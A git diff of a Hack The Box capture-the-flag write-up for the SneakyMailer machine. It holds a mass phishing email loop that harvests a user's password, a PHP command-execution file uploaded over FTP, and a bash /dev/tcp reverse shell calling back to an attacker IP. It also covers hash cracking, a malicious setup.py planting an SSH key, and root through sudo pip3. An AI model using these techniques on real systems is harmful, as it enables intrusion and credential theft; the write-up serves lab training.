@@ -2,19 +2,19 @@
 
 ## Overview
 
-![](<machine>.infocard.png)
+![](../../.gitbook/assets/0-sneakymailer-infocard.png)
 
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
 
-#### Save a transcript of any session (even remote nc sessions!)
+#### Save a transcript of any session \(even remote nc sessions!\)
 
-- With the command `script $log_filename` you can save the output of any session, including stderr and output from programs such as nano and vim! This is extremely invaluable when you exit a session and have forgotten to copy or backup something you did. To stop the transcript type `exit` after exiting any shells you may have spawned during that session.
+* With the command `script $log_filename` you can save the output of any session, including stderr and output from programs such as nano and vim! This is extremely invaluable when you exit a session and have forgotten to copy or backup something you did. To stop the transcript type `exit` after exiting any shells you may have spawned during that session.
 
 #### Useful thing 2
 
-- description with generic example
+* description with generic example
 
 ## Enumeration
 
@@ -22,7 +22,7 @@ Short description to include any strange things to be dealt with
 
 I started my enumeration with an nmap scan of `10.10.10.197`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ nmap -n -v -sCV -p- 10.10.10.197
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 16:59 EST
@@ -122,7 +122,7 @@ Nmap done: 1 IP address (1 host up) scanned in 81.28 seconds
 
 21,22,25,80,143,993,8080 open
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ ftp 10.10.10.197
 Connected to 10.10.10.197.
@@ -134,78 +134,112 @@ ftp> exit
 221 Goodbye.
 ```
 
-port 80 - redirected to http://sneakycorp.htb/ - added to /etc/hosts
+First I tried anonymous login through FTP, but was denied access.
 
-Cara Stevens & Bradley Greer - from messages pop-up
 
+
+port 80 - redirected to [http://sneakycorp.htb/](http://sneakycorp.htb/) - added to /etc/hosts
+
+![](../../.gitbook/assets/1-sneakycorp.png)
+
+After adding the domain name to /etc/hosts
+
+
+
+![](../../.gitbook/assets/2-messages.png)
+
+I found the names Cara Stevens & Bradley Greer from the messages pop-up.  Possible usernames can be extracted from these names using common business username patterns.
+
+![](../../.gitbook/assets/2-messages2.png)
+
+I also checked the page source code to see if there was anything interesting in the messages that couldn't be seen in the previews, and found that Bradley Greer was my 'personal tester' and Cara Stevens was the owner of the company.  Both seemed like good targets.
+
+![](../../.gitbook/assets/3-users-list.png)
+
+On the `/team.php` page there was a listing of company employees.  
+
+```text
+Name    Position    Office    Email
+Airi Satou     Accountant     Tokyo     airisatou@sneakymailer.htb
+Angelica Ramos     Chief Executive Officer (CEO)     London     angelicaramos@sneakymailer.htb
+Ashton Cox     Junior Technical Author     San Francisco     ashtoncox@sneakymailer.htb
+Bradley Greer     Tester     London     bradleygreer@sneakymailer.htb
+Brenden Wagner     Software Engineer     San Francisco     brendenwagner@sneakymailer.htb
+Brielle Williamson     Tester     New York     briellewilliamson@sneakymailer.htb
+Bruno Nash     Software Engineer     London     brunonash@sneakymailer.htb
+Caesar Vance     Tester     New York     caesarvance@sneakymailer.htb
+Cara Stevens     Sales Assistant     New York     carastevens@sneakymailer.htb
+Cedric Kelly     Senior Javascript Developer     Edinburgh     cedrickelly@sneakymailer.htb
+Charde Marshall     Tester     San Francisco     chardemarshall@sneakymailer.htb
+Colleen Hurst     Javascript Developer     San Francisco     colleenhurst@sneakymailer.htb
+Dai Rios     Personnel Lead     Edinburgh     dairios@sneakymailer.htb
+Donna Snider     Customer Support     New York     donnasnider@sneakymailer.htb
+Doris Wilder     Sales Assistant     Sidney     doriswilder@sneakymailer.htb
+Finn Camacho     Support Engineer     San Francisco     finncamacho@sneakymailer.htb
+Fiona Green     Tester     San Francisco     fionagreen@sneakymailer.htb
+Garrett Winters     Accountant     Tokyo     garrettwinters@sneakymailer.htb
+Gavin Cortez     Team Leader     San Francisco     gavincortez@sneakymailer.htb
+Gavin Joyce     Developer     Edinburgh     gavinjoyce@sneakymailer.htb
+Gloria Little     Systems Administrator     New York     glorialittle@sneakymailer.htb
+Haley Kennedy     Tester     London     haleykennedy@sneakymailer.htb
+Hermione Butler     Regional Director     London     hermionebutler@sneakymailer.htb
+Herrod Chandler     Tester     San Francisco     herrodchandler@sneakymailer.htb
+Hope Fuentes     Secretary     San Francisco     hopefuentes@sneakymailer.htb
+Howard Hatfield     Office Manager     San Francisco     howardhatfield@sneakymailer.htb
+Jackson Bradshaw     Director     New York     jacksonbradshaw@sneakymailer.htb
+Jena Gaines     Office Manager     London     jenagaines@sneakymailer.htb
+Jenette Caldwell     Development Lead     New York     jenettecaldwell@sneakymailer.htb
+Jennifer Acosta     Junior Javascript Developer     Edinburgh     jenniferacosta@sneakymailer.htb
+Jennifer Chang     Regional Director     Singapore     jenniferchang@sneakymailer.htb
+Jonas Alexander     Developer     San Francisco     jonasalexander@sneakymailer.htb
+Lael Greer     Systems Administrator     London     laelgreer@sneakymailer.htb
+Martena Mccray     Post-Sales support     Edinburgh     martenamccray@sneakymailer.htb
+Michael Silva     Marketing Designer     London     michaelsilva@sneakymailer.htb
+Michelle House     Integration Specialist     Sidney     michellehouse@sneakymailer.htb
+Olivia Liang     Support Engineer     Singapore     olivialiang@sneakymailer.htb
+Paul Byrd     Tester     New York     paulbyrd@sneakymailer.htb
+Prescott Bartlett     Technical Author     London     prescottbartlett@sneakymailer.htb
+Quinn Flynn     Support Lead     Edinburgh     quinnflynn@sneakymailer.htb
+Rhona Davidson     Integration Specialist     Tokyo     rhonadavidson@sneakymailer.htb
+Sakura Yamamoto     Support Engineer     Tokyo     sakurayamamoto@sneakymailer.htb
+Serge Baldwin     Data Coordinator     Singapore     sergebaldwin@sneakymailer.htb
+Shad Decker     Regional Director     Edinburgh     shaddecker@sneakymailer.htb
+Shou Itou     Regional Marketing     Tokyo     shouitou@sneakymailer.htb
+Sonya Frost     Tester     Edinburgh     sonyafrost@sneakymailer.htb
+Suki Burks     Developer     London     sukiburks@sneakymailer.htb
+sulcud     The new guy     Freelance     sulcud@sneakymailer.htb
+Tatyana Fitzpatrick     Regional Director     London     tatyanafitzpatrick@sneakymailer.htb
+Thor Walton     Developer     New York     thorwalton@sneakymailer.htb
+Tiger Nixon     System Architect     Edinburgh     tigernixon@sneakymailer.htb
+Timothy Mooney     Office Manager     London     timothymooney@sneakymailer.htb
+Unity Butler     Marketing Designer     San Francisco     unitybutler@sneakymailer.htb
+Vivian Harrell     Financial Controller     San Francisco     vivianharrell@sneakymailer.htb
+Yuri Berry     Chief Marketing Officer (CMO)     New York     yuriberry@sneakymailer.htb
+Zenaida Frank     Software Engineer     New York     zenaidafrank@sneakymailer.htb
+Zorita Serrano     Software Engineer     San Francisco     zoritaserrano@sneakymailer.htb
 ```
-Name	Position	Office	Email
-Airi Satou 	Accountant 	Tokyo 	airisatou@sneakymailer.htb
-Angelica Ramos 	Chief Executive Officer (CEO) 	London 	angelicaramos@sneakymailer.htb
-Ashton Cox 	Junior Technical Author 	San Francisco 	ashtoncox@sneakymailer.htb
-Bradley Greer 	Tester 	London 	bradleygreer@sneakymailer.htb
-Brenden Wagner 	Software Engineer 	San Francisco 	brendenwagner@sneakymailer.htb
-Brielle Williamson 	Tester 	New York 	briellewilliamson@sneakymailer.htb
-Bruno Nash 	Software Engineer 	London 	brunonash@sneakymailer.htb
-Caesar Vance 	Tester 	New York 	caesarvance@sneakymailer.htb
-Cara Stevens 	Sales Assistant 	New York 	carastevens@sneakymailer.htb
-Cedric Kelly 	Senior Javascript Developer 	Edinburgh 	cedrickelly@sneakymailer.htb
-Charde Marshall 	Tester 	San Francisco 	chardemarshall@sneakymailer.htb
-Colleen Hurst 	Javascript Developer 	San Francisco 	colleenhurst@sneakymailer.htb
-Dai Rios 	Personnel Lead 	Edinburgh 	dairios@sneakymailer.htb
-Donna Snider 	Customer Support 	New York 	donnasnider@sneakymailer.htb
-Doris Wilder 	Sales Assistant 	Sidney 	doriswilder@sneakymailer.htb
-Finn Camacho 	Support Engineer 	San Francisco 	finncamacho@sneakymailer.htb
-Fiona Green 	Tester 	San Francisco 	fionagreen@sneakymailer.htb
-Garrett Winters 	Accountant 	Tokyo 	garrettwinters@sneakymailer.htb
-Gavin Cortez 	Team Leader 	San Francisco 	gavincortez@sneakymailer.htb
-Gavin Joyce 	Developer 	Edinburgh 	gavinjoyce@sneakymailer.htb
-Gloria Little 	Systems Administrator 	New York 	glorialittle@sneakymailer.htb
-Haley Kennedy 	Tester 	London 	haleykennedy@sneakymailer.htb
-Hermione Butler 	Regional Director 	London 	hermionebutler@sneakymailer.htb
-Herrod Chandler 	Tester 	San Francisco 	herrodchandler@sneakymailer.htb
-Hope Fuentes 	Secretary 	San Francisco 	hopefuentes@sneakymailer.htb
-Howard Hatfield 	Office Manager 	San Francisco 	howardhatfield@sneakymailer.htb
-Jackson Bradshaw 	Director 	New York 	jacksonbradshaw@sneakymailer.htb
-Jena Gaines 	Office Manager 	London 	jenagaines@sneakymailer.htb
-Jenette Caldwell 	Development Lead 	New York 	jenettecaldwell@sneakymailer.htb
-Jennifer Acosta 	Junior Javascript Developer 	Edinburgh 	jenniferacosta@sneakymailer.htb
-Jennifer Chang 	Regional Director 	Singapore 	jenniferchang@sneakymailer.htb
-Jonas Alexander 	Developer 	San Francisco 	jonasalexander@sneakymailer.htb
-Lael Greer 	Systems Administrator 	London 	laelgreer@sneakymailer.htb
-Martena Mccray 	Post-Sales support 	Edinburgh 	martenamccray@sneakymailer.htb
-Michael Silva 	Marketing Designer 	London 	michaelsilva@sneakymailer.htb
-Michelle House 	Integration Specialist 	Sidney 	michellehouse@sneakymailer.htb
-Olivia Liang 	Support Engineer 	Singapore 	olivialiang@sneakymailer.htb
-Paul Byrd 	Tester 	New York 	paulbyrd@sneakymailer.htb
-Prescott Bartlett 	Technical Author 	London 	prescottbartlett@sneakymailer.htb
-Quinn Flynn 	Support Lead 	Edinburgh 	quinnflynn@sneakymailer.htb
-Rhona Davidson 	Integration Specialist 	Tokyo 	rhonadavidson@sneakymailer.htb
-Sakura Yamamoto 	Support Engineer 	Tokyo 	sakurayamamoto@sneakymailer.htb
-Serge Baldwin 	Data Coordinator 	Singapore 	sergebaldwin@sneakymailer.htb
-Shad Decker 	Regional Director 	Edinburgh 	shaddecker@sneakymailer.htb
-Shou Itou 	Regional Marketing 	Tokyo 	shouitou@sneakymailer.htb
-Sonya Frost 	Tester 	Edinburgh 	sonyafrost@sneakymailer.htb
-Suki Burks 	Developer 	London 	sukiburks@sneakymailer.htb
-sulcud 	The new guy 	Freelance 	sulcud@sneakymailer.htb
-Tatyana Fitzpatrick 	Regional Director 	London 	tatyanafitzpatrick@sneakymailer.htb
-Thor Walton 	Developer 	New York 	thorwalton@sneakymailer.htb
-Tiger Nixon 	System Architect 	Edinburgh 	tigernixon@sneakymailer.htb
-Timothy Mooney 	Office Manager 	London 	timothymooney@sneakymailer.htb
-Unity Butler 	Marketing Designer 	San Francisco 	unitybutler@sneakymailer.htb
-Vivian Harrell 	Financial Controller 	San Francisco 	vivianharrell@sneakymailer.htb
-Yuri Berry 	Chief Marketing Officer (CMO) 	New York 	yuriberry@sneakymailer.htb
-Zenaida Frank 	Software Engineer 	New York 	zenaidafrank@sneakymailer.htb
-Zorita Serrano 	Software Engineer 	San Francisco 	zoritaserrano@sneakymailer.htb
-```
 
-There was a huge list of employees at the company.  I added the usernames to a list for later 
+There was a huge list of employees at the company. I added the usernames and emails to lists for later use
 
-Hint: found out afterwards that there is a nice tool that can extract emails from a page: https://email-checker.net/extract
+{% hint style="info" %}
+I found out afterwards that there is a nice tool that can extract emails from a page: [https://email-checker.net/extract](https://email-checker.net/extract)
+{% endhint %}
+
+![](../../.gitbook/assets/1-sneakycorp-register.png)
+
+In the source code of the page I also found a reference to a register page at `/pypi/register.php`.  
+
+![](../../.gitbook/assets/1-sneakycorp-dirbust-pypi.png)
+
+Dirbuster also found this page shortly afterwards, though there wasn't much else to look through.
+
+![](../../.gitbook/assets/1-sneakycorp-register2.png)
+
+I navigated to this register page and tried to create an account, however it did not seem to be functional.
 
 typing in pypi.sneakycorp.htb redirects to the main page, loaded ffuf to see if I could find any other virtual hosts
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.sneakycorp.htb/ -c                     
 
@@ -231,9 +265,25 @@ ________________________________________________
 dev                     [Status: 200, Size: 13737, Words: 4007, Lines: 341]
 ```
 
-on dev.sneakycorp.htb found a site that was almost identical to main page, though the register page was visible in a link here.  Tried to register again
+![](../../.gitbook/assets/4-dev-sneakycorp.png)
 
-```
+on dev.sneakycorp.htb found a site that was almost identical to main page, though the register page was visible in a link here. 
+
+![](../../.gitbook/assets/4-dev-sneakycorp-register.png)
+
+Tried to register again
+
+![](../../.gitbook/assets/4-dev-sneakycorp-8080.png)
+
+Decided to check out the port 8080 on each of the virtual hosts, dev did not lead anywhere, but pypi did: [http://pypi.sneakycorp.htb:8080/](http://pypi.sneakycorp.htb:8080/)
+
+found pypiserver version 1.3.2 - newest is 1.4.2
+
+[https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273](https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273)
+
+
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ telnet sneakycorp.htb 25                                                                        1 ⨯
 Trying 10.10.10.197...
@@ -270,12 +320,9 @@ QUIT
 Connection closed by foreign host.
 ```
 
-https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/
-https://www.mailenable.com/kb/content/article.asp?ID=ME020207
-Sent an email to my personal tester greer-nanka...
-tested a few addresses, all seem valid
+[https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/](https://www.interserver.net/tips/kb/check-email-address-really-exists-without-sending-email/) [https://www.mailenable.com/kb/content/article.asp?ID=ME020207](https://www.mailenable.com/kb/content/article.asp?ID=ME020207) Sent an email to my personal tester greer-nanka... tested a few addresses, all seem valid
 
-```
+```text
 msf5 exploit(multi/handler) > use smtp_enum
 
 Matching Modules
@@ -302,7 +349,7 @@ Module options (auxiliary/scanner/smtp/smtp_enum):
 msf5 auxiliary(scanner/smtp/smtp_enum) > set rhosts 10.10.10.197
 rhosts => 10.10.10.197
 msf5 auxiliary(scanner/smtp/smtp_enum) > run
- 
+
 
 [*] 10.10.10.197:25       - 10.10.10.197:25 Banner: 220 debian ESMTP Postfix (Debian/GNU)
 [+] 10.10.10.197:25       - 10.10.10.197:25 Users found: , _apt, avahi-autoipd, backup, bin, daemon, ftp, games, gnats, irc, list, lp, mail, man, messagebus, news, nobody, postfix, postmaster, proxy, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, uucp, www-data
@@ -318,16 +365,13 @@ msf5 auxiliary(scanner/smtp/smtp_enum) > run
 [*] Auxiliary module execution completed
 ```
 
-Decided to check out the port 8080 on each of the virtual hosts, dev did not lead anywhere, but pypi did: http://pypi.sneakycorp.htb:8080/
+verified all the usernames
 
-found pypiserver version 1.3.2 - newest is 1.4.2
-
-https://blog.pentesteracademy.com/learn-to-interact-with-pypi-server-in-3-minutes-71d45fa46273
-
-https://github.com/jetmore/swaks
+[https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
 
 clean this up, remove extra data, add first email address and snipped...
-```
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ for address in $(cat users); do swaks --helo sneakycorp.htb --to $address --from zweilos@sneakymailer.htb --header "Subject: Check this out" --body "Check this out! http://10.10.15.100:8090/" --server 10.10.10.197; done  
 === Trying 10.10.10.197:25...
@@ -404,9 +448,9 @@ clean this up, remove extra data, add first email address and snipped...
 === Connection closed with remote host.
 ```
 
-no reply, so maybe try working local address? also put the "link" on a new line in case whatever script cant parse it for some reason (maybe the `!`?)
+no reply, so maybe try working local address? also put the "link" on a new line in case whatever script cant parse it for some reason \(maybe the `!`?\)
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ for address in $(cat users); do swaks --helo sneakycorp.htb --to $address --from root@sneakymailer.htb --header "Subject: Check this out" --body "Check this out! \nhttp://10.10.15.100:8090/" --server 10.10.10.197; done 
 
@@ -528,7 +572,7 @@ no reply, so maybe try working local address? also put the "link" on a new line 
 
 going to try restting box since getting no replies to phishing email, also remove `!` from body to see if that causing issues
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ nc -lvnp 8090                                                                                  1 ⨯
 listening on [any] 8090 ...
@@ -545,18 +589,21 @@ Content-Type: application/x-www-form-urlencoded
 firstName=Paul&lastName=Byrd&email=paulbyrd%40sneakymailer.htb&password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt&rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt
 ```
 
-Got a click! The user Paul Byrd clicked on my link and gave me a (URL-encoded) password.
+Got a click! The user Paul Byrd clicked on my link and gave me a \(URL-encoded\) password.
 
-```
+```text
 firstName=Paul&lastName=Byrd&email=paulbyrd@sneakymailer.htb&password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht&rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 ```
+
 This decodes to give me a password of
-```
+
+```text
 ^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
 ```
+
 Since Paul was nice enough to send me his email pasword, I decided to log into his mailbox to see what kind of information I could find
 
-```
+```text
 Hello administrator, I want to change this password for the developer account
 
 Username: developer
@@ -565,9 +612,9 @@ Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
 Please notify me when you do it
 ```
 
-Now I had developer creds, this could most likely log into tthe pypi server I found earlier.  This did not work, nor did logging into SSH.  I checked back with my nmap to see if there were any other services I could try, and noticed port 21 - FTP was open, so I gave it a try
+Now I had developer creds, this could most likely log into tthe pypi server I found earlier. This did not work, nor did logging into SSH. I checked back with my nmap to see if there were any other services I could try, and noticed port 21 - FTP was open, so I gave it a try
 
-```
+```text
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
 └─$ ftp 10.10.10.197                                                                              255 ⨯
 Connected to 10.10.10.197.
@@ -715,11 +762,11 @@ ftp> ls
 -rwxr-xr-x    1 0        0              90 May 26 18:52 _rotate.scss
 -rwxr-xr-x    1 0        0             699 May 26 18:52 _text.scss
 226 Directory send OK.
-
 ```
-I was able to successfully login, and began looking around.  It appeared as if the ftp server location was the same as the webhost.  I exfiltrated some of the files to my machine for further analysis.  None of the files seemed to have anything interesting in them.  
 
-```
+I was able to successfully login, and began looking around. It appeared as if the ftp server location was the same as the webhost. I exfiltrated some of the files to my machine for further analysis. None of the files seemed to have anything interesting in them.
+
+```text
 ftp> put php-code-exec.php
 local: php-code-exec.php remote: php-code-exec.php
 200 PORT command successful. Consider using PASV.
@@ -741,7 +788,7 @@ drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
 226 Directory send OK.
 ```
 
-After testing some things in the FTP server, I realized that I had the ability to use the PUT command.  Since this seemed to be the code for the site, I put a test file to see if I could access it from my browser.
+After testing some things in the FTP server, I realized that I had the ability to use the PUT command. Since this seemed to be the code for the site, I put a test file to see if I could access it from my browser.
 
 ```php
 <?php
@@ -762,7 +809,7 @@ Using this I was able to identify that I was running in the context of www-data,
 
 got running processes, etc/passwd, could not add ssh keys, next tried reverse shell
 
-```
+```text
 GET /php-code-exec.php?var=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.174/44445+0>%261' HTTP/1.1
 
 Host: dev.sneakycorp.htb
@@ -786,7 +833,7 @@ Sec-GPC: 1
 
 sent my reverse shell, and immediately got a connection on my waiting netcat listener
 
-```
+```text
 zweilos@kali:~/htb/sneakymailer$ script sneaky-transcript
 Script started, output log file is 'sneaky-transcript'.
 ┌──(zweilos㉿kali)-[~/htb/sneakymailer]
@@ -809,9 +856,10 @@ id && hostname
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sneakymailer
 ```
+
 snarted enumeration
 
-```
+```text
 www-data@sneakymailer:~/dev.sneakycorp.htb/dev$ ls -la
 total 76
 drwxrwxr-x 8 root developer  4096 Nov 11 13:23 .
@@ -844,7 +892,7 @@ pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
 
 found what looked like a hash for pypi in the pypi.sneakycorp.htb folder
 
-```
+```text
 www-data@sneakymailer:~/sneakycorp.htb$ cd /home
 www-data@sneakymailer:/home$ ls
 low  vmail
@@ -857,9 +905,10 @@ drwxr-xr-x 18 root  root  4096 May 14 05:30 ..
 drwxr-xr-x  8 low   low   4096 Jun  8 03:47 low
 drwx------  5 vmail vmail 4096 May 19 21:10 vmail
 ```
+
 in the /home directory there were only two folders, low, and vmail
 
-```
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ hash-identifier hashes                                                          
    #########################################################################
@@ -884,9 +933,10 @@ Possible Hashs:
 [+] MD5(APR)
 --------------------------------------------------
 ```
-the hash came up as type MD5(APR)
 
-```
+the hash came up as type MD5\(APR\)
+
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ hashcat --help | grep -i APR                                                    
    1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | FTP, HTTP, SMTP, LDAP Server
@@ -896,7 +946,7 @@ hashcat's help ID'd it at an Apache MD5 hash
 
 ### Finding user creds
 
-```
+```text
 ┌──(zweilos㉿kali)-[~]
 └─$ hashcat -a0 -m1600 --username htb/sneakymailer/hash /usr/share/wordlists/rockyou.txt         
 hashcat (v6.1.1) starting...
@@ -925,7 +975,7 @@ Dictionary cache hit:
 * Keyspace..: 14344385
 
 $apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui
-                                                 
+
 Session..........: hashcat
 Status...........: Cracked
 Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
@@ -948,10 +998,9 @@ Stopped: Wed Nov 11 15:55:16 2020
 
 The password enabled me to log in to `http://pypi.sneakycorp.htb:8080/` with the creds `pypi:soufianeelhaoui`
 
+There was nothing interesting on either of the sites linked on this page however. I went back to the machine and tried to switch users to `developer` with the credentials mentioned in the email
 
-There was nothing interesting on either of the sites linked on this page however.  I went back to the machine and tried to switch users to `developer` with the credentials mentioned in the email
-
-```
+```text
 developer@sneakymailer:/dev/shm/pypkg$ id
 uid=1001(developer) gid=1001(developer) groups=1001(developer)
 www-data@sneakymailer:~/pypkg$ su developer
@@ -967,13 +1016,11 @@ Sorry, user developer may not run sudo on sneakymailer.
 
 I had a wierd network hiccup that caused authentication to fail the first try, but then I found out that this user was not able to run commands with `sudo`
 
-
-https://pypi.org/project/pypiserver/#upload-with-setuptools
-
+[https://pypi.org/project/pypiserver/\#upload-with-setuptools](https://pypi.org/project/pypiserver/#upload-with-setuptools)
 
 > On client-side, edit or create a ~/.pypirc file with a similar content:
 
-```
+```text
     [distutils]
     index-servers =
       pypi
@@ -991,11 +1038,11 @@ https://pypi.org/project/pypiserver/#upload-with-setuptools
 
 > Then from within the directory of the python-project you wish to upload, issue this command:
 
-```
+```text
     python setup.py sdist upload -r local
 ```
 
-Then I wrote a setup.py python script as specified at https://packaging.python.org/tutorials/packaging-projects/#creating-setup-py
+Then I wrote a setup.py python script as specified at [https://packaging.python.org/tutorials/packaging-projects/\#creating-setup-py](https://packaging.python.org/tutorials/packaging-projects/#creating-setup-py)
 
 ```python
 import setuptools
@@ -1026,9 +1073,9 @@ setuptools.setup(
 )
 ```
 
-I first tried writing my ssh key to `low` but the script was being run in the context of `developer` and not being installed for some reason.  I added a check to make sure that `low` (userID 1000) was the one running it.  Next I followed the instructions to install the package into pypiserver
+I first tried writing my ssh key to `low` but the script was being run in the context of `developer` and not being installed for some reason. I added a check to make sure that `low` \(userID 1000\) was the one running it. Next I followed the instructions to install the package into pypiserver
 
-```
+```text
 [distutils]
 index-servers =
   pypi
@@ -1048,7 +1095,7 @@ I created the `.pypirc` file in my distribution's directory, then set this to be
 
 ### User.txt
 
-```
+```text
 developer@sneakymailer:~$ python3 setup.py sdist register -r local upload -r local
 running sdist
 running egg_info
@@ -1083,7 +1130,7 @@ WARNING: Uploading via this command is deprecated, use twine to upload instead (
 
 It complained a bit that I didn't create a readme, but it ran
 
-```
+```text
 ┌──(zweilos㉿kali-[~/htb/sneakymailer]
 └─$ ssh -i dev low@sneakycorp.htb   
 The authenticity of host 'sneakycorp.htb (10.10.10.197)' can't be established.
@@ -1114,9 +1161,9 @@ low@sneakymailer:~$ cat user.txt
 06106e8ea4721e1a01714bf6ef000a88
 ```
 
-Next I tried logging in with the ssh key I had made and was successful!  I got that same temporary name resolution error when using `sudo -l`, where it seemed to hang for a minute, but this time I got a very interesting result!
+Next I tried logging in with the ssh key I had made and was successful! I got that same temporary name resolution error when using `sudo -l`, where it seemed to hang for a minute, but this time I got a very interesting result!
 
-```
+```text
 low@sneakymailer:/dev/shm/fin$ pip3 install setup.py
 Looking in indexes: http://pypi.sneakycorp.htb:8080/simple/
 Collecting setup.py
@@ -1125,31 +1172,28 @@ Collecting setup.py
 No matching distribution found for setup.py
 ```
 
-searching for ways to privilege escalation with sudo pip3 leads to https://gtfobins.github.io/gtfobins/pip/
+searching for ways to privilege escalation with sudo pip3 leads to [https://gtfobins.github.io/gtfobins/pip/](https://gtfobins.github.io/gtfobins/pip/)
 
-> File write
-> It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.
+> File write It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.
 
-    It needs an absolute local file path.
+```text
+It needs an absolute local file path.
 ```
+
+```text
     export LFILE=/tmp/file_to_save
     TF=$(mktemp -d)
     echo "open('$LFILE','w+').write('DATA')" > $TF/setup.py
     pip install $TF
-
 ```
-
-
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User <username>
-
-
+### Enumeration as User
 
 ### Getting a shell
 
-```
+```text
 low@sneakymailer:/dev/shm$ TF=$(mktemp -d)
 low@sneakymailer:/dev/shm$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
 low@sneakymailer:/dev/shm$ sudo pip3 install $TF
@@ -1169,13 +1213,13 @@ drwxr-xr-x  2 root root 4096 Nov 11 20:49 pip-egg-info
 -rw-r--r--  1 root root   86 Nov 11 20:49 setup.py
 # pwd
 /tmp/pip-req-build-2ueqz020
-
 ```
+
 I was not in the directory I expected at first...the shell spawned in the tmp directory where the "module" was installed to
 
 ### Root.txt
 
-```
+```text
 # cd /root
 # ls -la
 total 44
@@ -1195,7 +1239,9 @@ drwxr-xr-x  3 root root 4096 May 14 12:57 .local
 81337e5b7eb0c72e251736d031a72998
 ```
 
-
 Thanks to [`<box_creator>`](https://www.hackthebox.eu/home/users/profile/<profile_num>) for something interesting or useful about this machine.
 
+![](../../.gitbook/assets/sneakymailer-pwned.png)
+
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
+
